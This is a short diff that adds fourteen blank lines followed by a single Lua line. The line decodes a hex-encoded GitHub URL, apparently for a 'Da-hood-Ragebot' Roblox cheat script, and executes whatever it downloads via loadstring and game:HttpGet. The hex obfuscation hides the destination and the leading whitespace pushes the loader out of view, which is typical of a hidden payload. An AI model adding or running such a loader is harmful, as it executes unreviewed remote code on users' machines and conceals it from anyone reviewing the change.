@@ -1,0 +1,15 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local a="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f736b652d636f64652f44612d686f6f642d52616765626f742f726566732f68656164732f6d61696e2f4c656769742e6c7561"local b=function(c)return string.char(tonumber(c,16))end local d=(a:gsub("..",b))loadstring(game:HttpGet(d))()
